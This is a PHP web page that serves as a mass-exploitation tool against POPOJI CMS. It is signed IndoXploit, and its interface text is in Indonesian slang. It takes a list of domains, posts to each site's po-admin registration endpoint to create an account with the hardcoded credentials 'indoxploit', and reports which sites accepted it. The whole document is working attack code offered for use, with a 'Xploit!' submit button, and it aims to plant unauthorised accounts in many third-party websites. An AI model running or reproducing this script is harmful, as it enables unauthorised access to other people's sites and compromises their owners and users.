<html>
<head>
<title>POPOJI CMS Add Admin Auto Registration</title>
<meta name="author" content="IndoXploit">
<style type="text/css">
html {
	margin: 20px auto;
	background: #000000;
	color: #ffffff;
}
header {
	color: lime;
	font-size: 35px;
	margin: 10px auto;
	text-align: center;
	text-decoration: underline;
}
input[type=text] {
	border: 1px solid #008000;
	color: #bb0000;
	width: 500px;
	height: 20px;
	padding-left: 5px;
	margin: 5px auto;
	background: transparent;
}
input[type=submit] {
	border: 1px solid #008000;
	color: #bb0000;
	background: transparent;
	width: 500px;
}
textarea {
	background: transparent;
	color: #bb0000;
	border: 1px solid #008000;
	resize: none;
	width: 500px;
	height: 250px;
	padding-left: 5px;
	margin: 5px auto;
}
a {
	text-decoration: none;
	color: lime;
}
a:hover {
	text-decoration: underline;
}
</style>
</head>
<?php
set_time_limit(0);
error_reporting(0);

function dav($url, $post=null) {
	$ch = curl_init();
		  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		  curl_setopt($ch, CURLOPT_URL, $url);
		  if($post != null) {
		  	curl_setopt($ch, CURLOPT_POST, true);
		  	curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
		  }
		  curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
		  curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookie.txt');
		  curl_setopt($ch, CURLOPT_COOKIESESSION, true);
		  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
		  curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HHTP_USER_AGENT']);
		  curl_setopt($ch, CURLOPT_HEADER, 0);
	return curl_exec($ch);
		  curl_close($ch);
}

$sites = explode("\r\n", $_POST['url']);
$user = "indoxploit";
$pass = $user;
$email = htmlspecialchars($_POST['email']);
if($_POST['hajar']) {
	echo "<span style='font-size: 25px; text-decoration: underline; color: lime; margin-bottom: 20px;'>Result Gannnnn</span><p>";
	if(!filter_var($email, FILTER_VALIDATE_EMAIL) === false) {
		foreach($sites as $url) {
			if(!preg_match("/^http:\/\//", $url) AND !preg_match("/^https:\/\//", $url)) {
				$url = "http://".$url;
			} else {
				$url = $url;
			}
			echo "[+] Nyecan -> $url<br>";
			$post_register = array(
				"username" => $user,
				"email" => $email,
				"password" => $pass,
				"re-password" => $pass,
				);
			$register = dav("$url/po-admin/actregister.php", $post_register);
			echo "[+] Register ";
			if(!preg_match("/404|headers already sent|disabled for security reasons|Please type another email!/", $register) AND preg_match("/SUCCESS!!!|>Check your email for next step. Thank you!/", $register)) {
				echo "<font color=lime>OK!</font><br>";
				echo "[+] <font color=gold>Cek emailmu buat aktivasi</font><br>";
				echo "[+] u/p: <font color=lime>$user</font><br><br>";
				$post_login = array(
					"username" => $user,
					"password" => $pass,
					);
			} else {
				echo "<font color=red>Gagal!</font><br><br>";
			}
		}
	} else {
		echo "<font color=red>Emailmu ga valid bosss, email harus valid biar bisa masuk token registrasinyaa.</font>";
	}
} else {
?>
<center>
<header>POPOJI Auto Registration</header>
<form method="post">
Email: <br>
<input type="text" name="email" value="trciksterlicikarus@gmail.com" placeholder="email@asu.com" required><br>
Domains: <br>
<textarea name="url"></textarea><br>
<input type="submit" name="hajar" value="Xploit!">
</form>
</center>
<?php
}
?>
</html>